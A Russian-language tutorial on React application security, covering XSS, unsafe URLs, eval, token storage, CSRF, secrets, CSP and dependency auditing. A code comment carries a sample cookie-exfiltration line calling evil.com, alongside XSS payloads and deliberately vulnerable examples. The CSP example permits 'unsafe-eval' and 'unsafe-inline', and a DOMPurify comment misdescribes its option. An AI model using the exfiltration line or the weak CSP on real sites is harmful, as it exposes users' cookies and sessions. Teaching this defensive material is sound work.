---
metaTitle: Безопасность в React — защита от XSS, CSRF и других уязвимостей
metaDescription: Полное руководство по безопасности React-приложений: защита от XSS-атак, безопасная работа с dangerouslySetInnerHTML, Content Security Policy, безопасная аутентификация и управление сессиями
author: Олег Марков
title: Безопасность в React — защита от XSS, CSRF и других уязвимостей
preview: React защищает от многих уязвимостей автоматически, но не от всех. Разберитесь, какие угрозы актуальны для React-приложений, как правильно работать с пользовательскими данными и не допустить XSS, CSRF и утечки чувствительной информации
---

## Введение

React разработан с учётом безопасности: он автоматически экранирует вывод переменных в JSX, предотвращая большинство XSS-атак. Однако защиту React можно обойти неправильным использованием API, и разработчик несёт ответственность за ряд аспектов безопасности.

В этой статье мы разберём основные угрозы для React-приложений и конкретные практики защиты от них.

## Как React защищает от XSS

XSS (Cross-Site Scripting) — внедрение вредоносного JavaScript через пользовательский ввод. React предотвращает это автоматически:

```tsx
// ✅ Безопасно: React экранирует HTML-символы
function Comment({ text }: { text: string }) {
  // Если text = '<script>alert("XSS")</script>'
  // React отобразит это как текст, не как код
  return <p>{text}</p>;
}

// Это автоматически становится:
// <p>&lt;script&gt;alert("XSS")&lt;/script&gt;</p>
```

React экранирует следующие символы: `&`, `<`, `>`, `"`, `'`. Это делает большинство попыток XSS через JSX неэффективными.

## Опасные паттерны и как их избегать

### 1. dangerouslySetInnerHTML — основной источник рисков

`dangerouslySetInnerHTML` обходит защиту React и вставляет HTML напрямую в DOM:

```tsx
// ❌ Опасно — передача непроверенного HTML
function BlogPost({ content }: { content: string }) {
  // Если content приходит от пользователя — это XSS-уязвимость
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// ✅ Безопасно — санитизация перед вставкой
import DOMPurify from 'dompurify';

function BlogPost({ content }: { content: string }) {
  const sanitizedContent = DOMPurify.sanitize(content, {
    // Разрешаем только базовые HTML-теги
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'h2', 'h3'],
    // Разрешаем только href у ссылок
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    // Принудительно добавляем rel="noopener noreferrer" для внешних ссылок
    ADD_ATTR: ['target'],
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />;
}
```

Установка DOMPurify:

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

### 2. Небезопасные URL в href и src

Ссылки `javascript:` и `data:` могут выполнять произвольный код:

```tsx
// ❌ Опасно — злоумышленник может передать javascript: URL
function UserLink({ href, label }: { href: string; label: string }) {
  return <a href={href}>{label}</a>;
  // href = "javascript:alert('XSS')" — выполнит код при клике
}

// ✅ Безопасно — проверяем URL перед использованием
function isSafeUrl(url: string): boolean {
  try {
    const parsed = new URL(url, window.location.href);
    // Разрешаем только http и https
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

function UserLink({ href, label }: { href: string; label: string }) {
  if (!isSafeUrl(href)) {
    console.warn(`Потенциально опасный URL заблокирован: ${href}`);
    return <span>{label}</span>; // Рендерим как текст без ссылки
  }

  return (
    <a
      href={href}
      // rel="noopener noreferrer" обязателен для внешних ссылок
      rel="noopener noreferrer"
      target="_blank"
    >
      {label}
    </a>
  );
}
```

### 3. eval() и похожие функции

```tsx
// ❌ Никогда не используйте eval() с пользовательскими данными
function Calculator({ expression }: { expression: string }) {
  // Если expression = "process.env.SECRET_KEY" — утечка данных
  // Если expression = "fetch('evil.com?d='+document.cookie)" — кража кукисов
  const result = eval(expression);
  return <span>{result}</span>;
}

// ✅ Используйте безопасные альтернативы
// Для математических выражений — специализированные парсеры
import { evaluate } from 'mathjs';

function Calculator({ expression }: { expression: string }) {
  try {
    // mathjs не выполняет произвольный код
    const result = evaluate(expression);
    return <span>{String(result)}</span>;
  } catch {
    return <span className="error">Некорректное выражение</span>;
  }
}
```

### 4. Передача данных через атрибут ref

```tsx
// ❌ Прямое манипулирование DOM без проверок
function InjectableComponent({ userHtml }: { userHtml: string }) {
  const divRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (divRef.current) {
      // Эквивалентно dangerouslySetInnerHTML — такая же опасность
      divRef.current.innerHTML = userHtml;
    }
  }, [userHtml]);

  return <div ref={divRef} />;
}

// ✅ Санитизация при работе с innerHTML через ref
function SafeContentContainer({ userHtml }: { userHtml: string }) {
  const divRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (divRef.current) {
      divRef.current.innerHTML = DOMPurify.sanitize(userHtml);
    }
  }, [userHtml]);

  return <div ref={divRef} />;
}
```

## Безопасное управление аутентификацией

### Хранение токенов

```tsx
// ❌ localStorage — доступен любому JS-коду на странице (уязвим к XSS)
localStorage.setItem('accessToken', token);

// ❌ sessionStorage — та же проблема
sessionStorage.setItem('accessToken', token);

// ✅ HttpOnly Cookie — недоступны JavaScript, только серверу
// Устанавливается на сервере:
// Set-Cookie: accessToken=...; HttpOnly; Secure; SameSite=Strict; Path=/

// В React нужно только передавать credentials при fetch:
fetch('/api/user', {
  credentials: 'include', // Отправляет куки вместе с запросом
});
```

### Защита от CSRF

CSRF (Cross-Site Request Forgery) — атака, при которой злоумышленник заставляет пользователя выполнить нежелательный запрос:

```tsx
// ✅ Использование CSRF-токена в запросах

// Хук для получения CSRF-токена из мета-тега (куда его помещает сервер)
function useCsrfToken(): string {
  return useMemo(() => {
    const meta = document.querySelector<HTMLMetaElement>('meta[name="csrf-token"]');
    return meta?.content ?? '';
  }, []);
}

// Axios-инстанс с автоматическим добавлением CSRF-токена
import axios from 'axios';

const apiClient = axios.create({
  baseURL: '/api',
  withCredentials: true, // Отправляем куки
});

// Интерсептор добавляет CSRF-токен ко всем мутирующим запросам
apiClient.interceptors.request.use((config) => {
  if (['post', 'put', 'patch', 'delete'].includes(config.method ?? '')) {
    const csrfToken = document.querySelector<HTMLMetaElement>('meta[name="csrf-token"]')?.content;
    if (csrfToken) {
      config.headers['X-CSRF-Token'] = csrfToken;
    }
  }
  return config;
});
```

### Безопасный логаут

```tsx
function useLogout() {
  const navigate = useNavigate();

  return useCallback(async () => {
    try {
      // Инвалидируем сессию на сервере
      await apiClient.post('/auth/logout');
    } finally {
      // Очищаем локальное состояние независимо от результата
      queryClient.clear();          // Очищаем React Query кэш
      localStorage.clear();         // Очищаем localStorage (если используется)
      sessionStorage.clear();

      // Перенаправляем на страницу логина
      navigate('/login', { replace: true });
    }
  }, [navigate]);
}
```

## Защита чувствительных данных

### Переменные окружения

```tsx
// ❌ Никогда не хардкодируйте секреты в коде
const API_KEY = 'sk-1234567890abcdef'; // Будет виден в исходниках браузера
const DB_PASSWORD = 'supersecret';

// ✅ Используйте переменные окружения
// .env
// REACT_APP_API_URL=https://api.example.com
// NEXT_PUBLIC_ANALYTICS_ID=UA-12345678

// В коде
const apiUrl = process.env.NEXT_PUBLIC_API_URL;

// ⚠️ Важно: В React (Vite/CRA/Next.js) переменные с префиксом
// VITE_ / REACT_APP_ / NEXT_PUBLIC_ доступны в браузере.
// Не добавляйте в них настоящие секреты — они попадут в бандл!
// Секретные ключи (API keys для серверных операций) должны быть ТОЛЬКО на сервере.
```

### Логирование — не логировать чувствительные данные

```tsx
// ❌ Логирование пароля или токена
console.log('Login attempt:', { email, password }); // пароль в логах!
console.log('Auth token:', token); // токен в логах!

// ✅ Логировать только безопасные данные
console.log('Login attempt:', { email }); // только email
console.log('Auth: token obtained, length =', token.length); // только метаданные

// Маскирование чувствительных полей при отладке
function maskSensitive(obj: Record<string, unknown>): Record<string, unknown> {
  const sensitiveKeys = ['password', 'token', 'secret', 'key', 'authorization'];
  return Object.fromEntries(
    Object.entries(obj).map(([key, value]) =>
      sensitiveKeys.some(k => key.toLowerCase().includes(k))
        ? [key, '***']
        : [key, value]
    )
  );
}

console.log('Request body:', maskSensitive(requestBody));
```

## Content Security Policy (CSP)

CSP — HTTP-заголовок, который ограничивает источники скриптов, стилей и других ресурсов. Это дополнительный уровень защиты от XSS.

### Настройка CSP в Next.js

```tsx
// next.config.js
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.example.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https://images.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
`;

module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: ContentSecurityPolicy.replace(/\n/g, ''),
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY', // Запрет встраивания в iframe
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff', // Запрет угадывания MIME-типа
          },
        ],
      },
    ];
  },
};
```

## Безопасность зависимостей

### Регулярный аудит npm-пакетов

```bash
# Проверка известных уязвимостей
npm audit

# Автоматическое исправление (безопасные обновления)
npm audit fix

# Просмотр подробностей о конкретной уязвимости
npm audit --json | jq '.vulnerabilities'

# Настройка автоматических проверок в CI
# .github/workflows/security.yml
```

```yaml
# .github/workflows/security.yml
name: Security Audit
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm audit --audit-level=moderate
```

### Принцип минимальных зависимостей

```tsx
// ❌ Устанавливаем большую библиотеку ради одной функции
import _ from 'lodash'; // 70KB
const unique = _.uniq(array);

// ✅ Используем нативные возможности
const unique = [...new Set(array)];

// Меньше зависимостей = меньше поверхность атаки
```

## Безопасная обработка данных пользователя

### Валидация входных данных

```tsx
import { z } from 'zod';

// Схема валидации — строгие ограничения на входные данные
const userSchema = z.object({
  name: z.string()
    .min(2, 'Имя слишком короткое')
    .max(50, 'Имя слишком длинное')
    .regex(/^[а-яёА-ЯЁa-zA-Z\s-]+$/, 'Имя содержит недопустимые символы'),

  email: z.string().email('Некорректный email').toLowerCase(),

  age: z.number().int().min(18).max(120),

  website: z.string()
    .url()
    .refine(
      url => ['http:', 'https:'].includes(new URL(url).protocol),
      'Разрешены только HTTP и HTTPS URL'
    )
    .optional(),
});

type UserFormData = z.infer<typeof userSchema>;

function UserForm() {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<UserFormData>({ resolver: zodResolver(userSchema) });

  const onSubmit = (data: UserFormData) => {
    // data уже прошла валидацию — безопасно отправлять
    api.createUser(data);
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)}>
      <input {...register('name')} />
      {errors.name && <span className="error">{errors.name.message}</span>}
      {/* ... */}
    </form>
  );
}
```

## Итоговый чеклист безопасности React-приложения

**XSS-защита:**
- [ ] `dangerouslySetInnerHTML` используется только с санитизированными данными (DOMPurify)
- [ ] URL в `href` и `src` проверяются на допустимые протоколы
- [ ] `eval()`, `Function()`, `innerHTML` не используются с пользовательскими данными

**Аутентификация:**
- [ ] Токены хранятся в HttpOnly Cookie, не в localStorage
- [ ] CSRF-защита реализована для мутирующих запросов
- [ ] Логаут инвалидирует серверную сессию и очищает клиентское состояние

**Данные:**
- [ ] Входные данные валидируются перед отправкой на сервер
- [ ] Чувствительные данные не логируются
- [ ] Секреты хранятся в переменных окружения (только серверные)

**Инфраструктура:**
- [ ] CSP-заголовки настроены
- [ ] Зависимости регулярно проверяются через `npm audit`
- [ ] Сторонние скрипты загружаются только из доверенных CDN

## Связанные темы

- [Доступность в React](../accessibility/index.md) — WCAG и a11y
- [Рефакторинг React-кода](../refactoring/index.md) — безопасный рефакторинг
- [Интеграции в React](../../integration/index.md) — безопасная работа с внешними API
